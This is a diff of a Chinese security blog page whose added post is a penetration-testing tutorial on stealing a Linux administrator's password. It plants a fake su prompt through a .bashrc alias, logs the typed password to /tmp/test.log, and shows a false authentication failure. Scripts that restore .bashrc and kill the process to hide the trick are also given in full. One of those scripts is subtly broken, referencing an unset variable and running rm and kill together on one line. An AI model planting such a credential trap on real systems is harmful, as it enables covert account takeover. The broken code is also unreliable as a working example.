@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>以较快的速度访问Github | Knsec         |       低调求发展 - 潜心习安全</title>
-  <meta name="keywords" content=" 其他 ">
-  <meta name="description" content="以较快的速度访问Github | Knsec         |       低调求发展 - 潜心习安全">
+  <title>Linux利用别名抓取账户切换时密码 | Knsec         |       低调求发展 - 潜心习安全</title>
+  <meta name="keywords" content=" Linux , 渗透技巧 ">
+  <meta name="description" content="Linux利用别名抓取账户切换时密码 | Knsec         |       低调求发展 - 潜心习安全">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="事由： 今天搭建环境打算做实验，下了一个Centos7镜像打算安装在虚拟机，供后续的测试。  安装系统镜像后使其可以上网 是没有网络的    要配置我们的虚拟机环境首先当然是给它通上网，之后才好配置一下国内的源    可以看到有两个设备，虚拟机一般为ens33  vi &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33 # 配置有线网络   直接把ONBOOT改为">
 <meta property="og:type" content="article">
@@ -303,9 +303,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-以较快的速度访问Github" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Linux利用别名抓取账户切换时密码" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">以较快的速度访问Github</h1>
+        <h1 class="article-title">Linux利用别名抓取账户切换时密码</h1>
     
     <div class="article-meta">
         
@@ -315,7 +315,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="杂记">杂记</a>
+            <a  data-rel="手法技巧">手法技巧</a>
             
         </span>
         
@@ -323,19 +323,21 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color3">其他</a>
+            <a class="color1">Linux</a>
+            
+            <a class="color5">渗透技巧</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2020-07-09 11:47:37'>2020-07-09 11:19</time>
+            发布时间 : <time class="date" title='最后更新: 2020-07-09 21:57:39'>2020-07-09 20:08</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:336</span>
+        <span>字数:838</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -354,7 +356,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#修改Host文件"><span class="toc-text">修改Host文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gitee"><span class="toc-text">gitee</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#梯子"><span class="toc-text">梯子</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#实现思路"><span class="toc-text">实现思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#具体实现（方法1）"><span class="toc-text">具体实现（方法1）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法2"><span class="toc-text">方法2</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -370,38 +372,124 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="修改Host文件"><a href="#修改Host文件" class="headerlink" title="修改Host文件"></a>修改Host文件</h2><blockquote>
-<p>C:\Windows\System32\drivers\etc\host</p>
+        <h3 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h3><blockquote>
+<p>在Linux系统下，有个 <strong>~/.bashrc文件</strong></p>
 </blockquote>
-<img src="/../images/image-20200709112420683.png" alt="image-20200709112420683" style="zoom:80%;" />
+<pre><code class="bash"># .bashrc
 
-<p>如果是第一次修改则需要去掉只读属性，并且更改文件的高级安全选项，使得自己的用户有权限修改host文件</p>
-<pre><code class="bash">192.30.253.112 Build software better, together 
-192.30.253.119 gist.github.com
-151.101.184.133 assets-cdn.github.com
-151.101.184.133 raw.githubusercontent.com
-151.101.184.133 gist.githubusercontent.com
-151.101.184.133 cloud.githubusercontent.com
-151.101.184.133 camo.githubusercontent.com
-151.101.184.133 avatars0.githubusercontent.com
-151.101.184.133 avatars1.githubusercontent.com
-151.101.184.133 avatars2.githubusercontent.com
-151.101.184.133 avatars3.githubusercontent.com
-151.101.184.133 Build software better, together
-151.101.184.133 avatars5.githubusercontent.com
-151.101.184.133 avatars6.githubusercontent.com
-151.101.184.133 avatars7.githubusercontent.com
-151.101.184.133 Build software better, together</code></pre>
-<img src="/../images/image-20200709112841487.png" alt="image-20200709112841487" style="zoom:80%;" />
+# User specific aliases and functions
 
-<p>修改过后保存并把刚刚修改的属性改回只读即可</p>
+alias rm=&#39;rm -i&#39;
+alias cp=&#39;cp -i&#39;
+alias mv=&#39;mv -i&#39;
+alias ll=&#39;ls -all&#39;    # 这是我刚刚添加的，
+# Source global definitions
+if [ -f /etc/bashrc ]; then
+        . /etc/bashrc
+fi</code></pre>
+<pre><code class="bash">source ~/.bashrc   # 重启环境变量之后别名才能生效，或直接注销当前账户也行</code></pre>
 <blockquote>
-<p>有些人会觉得修改host文件是一个安全性较差的方法</p>
-<p>其实修改host文件本质上就是省去了dns解析的步骤，但是当我们把Google修改到第三方ip地址时，这个做法确实是不能保证数据传输过程中的安全性。</p>
+<p>此时在终端输入 ‘ll’ 相当于输入ls -all</p>
 </blockquote>
-<p><font color='red'> 至此，可以加快访问Github的速度，并且顺带解决头像、图片加载不出来的问题 </font></p>
-<h2 id="gitee"><a href="#gitee" class="headerlink" title="gitee"></a>gitee</h2><p>许多人比较推荐国内的这个类似gitee，但因个人原因，不太愿意使用这个方法。</p>
-<h2 id="梯子"><a href="#梯子" class="headerlink" title="梯子"></a>梯子</h2>
+<pre><code class="bash">[root@localhost ~]# ll
+总用量 36
+dr-xr-x---.  2 root root  175 7月   9 09:03 .
+dr-xr-xr-x. 17 root root  224 7月   9 2020 ..
+-rw-------.  1 root root 1399 7月   9 2020 anaconda-ks.cfg
+-rw-------.  1 root root  421 7月   9 09:03 .bash_history
+-rw-r--r--.  1 root root   18 12月 28 2013 .bash_logout
+-rw-r--r--.  1 root root  176 12月 28 2013 .bash_profile
+-rw-r--r--.  1 root root  194 7月   9 09:03 .bashrc
+-rw-r--r--.  1 root root  100 12月 28 2013 .cshrc
+-rw-r--r--.  1 root root  129 12月 28 2013 .tcshrc
+-rw-------.  1 root root  639 7月   9 09:03 .viminfo
+</code></pre>
+<p><strong>输入ll的时候相当于ls -all ，在渗透测试时拿到低权限用户，不考虑提权，可以对此用户进行一个账户密码抓取</strong></p>
+<h3 id="具体实现（方法1）"><a href="#具体实现（方法1）" class="headerlink" title="具体实现（方法1）"></a>具体实现（方法1）</h3><blockquote>
+<p>看一下当低权限用户使用su 切换用户时，正常的信息显示</p>
+</blockquote>
+<pre><code class="bash">[Knsec@localhost ~]$ su - root
+Password: 
+su: Authentication failure
+[Knsec@localhost ~]$ </code></pre>
+<blockquote>
+<p>编写shell脚本，并把抓到的密码存到想存的地方</p>
+</blockquote>
+<pre><code class="bash">#!/bin/bash
+echo -e &quot;Password: \c&quot;  # \c 为不换行
+read -s pass
+echo $pass &gt;&gt; /tmp/test.log
+echo &quot;&quot;
+echo &quot;su: Authentication failure&quot;</code></pre>
+<pre><code class="bash">chmod 755 1.sh    # 添加权限</code></pre>
+<p><img src="/../images/image-20200709211848965.png" alt="image-20200709211848965"></p>
+<p>嗯。。。 有点这个意思了</p>
+<p>利用上面说到的别名进行修改。<strong>记得重启环境变量</strong></p>
+<p><img src="/../images/image-20200709212233643.png" alt="image-20200709212233643"></p>
+<pre><code class="bash">source ~/.bashrc</code></pre>
+<p><img src="/../images/image-20200709212421145.png" alt="image-20200709212421145"></p>
+<p>但是这样管理员会一直无法认证成功，最后导致暴露。在脚本原有的基础上添加</p>
+<pre><code class="bash">#!/bin/bash
+echo -e &quot;Password: \c&quot;  # \c 为不换行
+read -s pass
+echo $pass &gt;&gt; /tmp/test.log
+echo &quot;&quot;
+echo &quot;su: Authentication failure&quot;
+cp -p /tmp/.bashrc .bashrc
+rm /tmp/.bashrc
+source ~/.bashrc</code></pre>
+<blockquote>
+<p>把源文件备份至指定可写目录中</p>
+</blockquote>
+<p>然后运行</p>
+<p><img src="/../images/image-20200709213718232.png" alt="image-20200709213718232"></p>
+<p>失败一次之后，管理员可能会觉得是自己密码打错了，此时我们已经抓了密码。</p>
+<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><blockquote>
+<p>此时存在一个问题，当用户退出时，如果习惯使用exit退出终端，需要输入两边才可能退出</p>
+</blockquote>
+<p><img src="/../images/image-20200709213934721.png" alt="image-20200709213934721"></p>
+<blockquote>
+<p>此时需要分析管理员的习惯，是习惯直接关掉终端还是习惯使用exit退出终端之后再关掉窗口</p>
+</blockquote>
+<p>如果习惯使用exit则使用下面方法</p>
+<p>备份两个源.bashrc文件</p>
+<pre><code class="bash">[Knsec@localhost ~]$ cp -p .bashrc /tmp/.bashrc
+[Knsec@localhost ~]$ cp -p .bashrc /tmp/.bashrc_tmp</code></pre>
+<p>修改.bashrc_tmp</p>
+<pre><code class="bash">alias exit=&#39;./2.sh&#39;</code></pre>
+<p>修改1.sh</p>
+<pre><code class="bash">#!/bin/bash
+echo -e &quot;Password: \c&quot;  # \c 为不换行
+read -s pass
+echo $pass &gt;&gt; /tmp/test.log
+echo &quot;&quot;
+echo &quot;su: Authentication failure&quot;
+cp -p /tmp/.bashrc_tmp .bashrc
+rm /tmp/.bashrc_tmp
+bash</code></pre>
+<p>修改2.sh</p>
+<pre><code class="bash">#!/bin/bash
+#  寻找su恶意脚本并kill掉，实现一次exit就退出
+ps_result=`ps -ef | grep &quot;/bin/bash ./1.sh&quot;` 
+pid=`echo $tmp | awk &#39;{print $3}&#39;`
+cp -p /tmp/.bashrc .bashrc 
+rm /tmp/.bashrc kill -9 $pid</code></pre>
+<p>效果：</p>
+<pre><code class="bash">[Knsec@localhost ~]$ su - root
+Password: 
+su: Authentication failure
+[Knsec@localhost ~]$ su - root
+Password：
+Last login：Thu Jul 9 09:42:40 EDT 2020 on pts/0 
+[root@localhost ~]# exit
+logout
+[Knsec@localhost ~]$ 
+</code></pre>
+<blockquote>
+<p>至此，管理员习惯输入exit退出终端时，执行完恶意脚本，输入一次exit即可退出终端</p>
+<p>如果是管理员习惯直接关掉窗口，则使用方法1</p>
+</blockquote>
+
       
        
     </div>
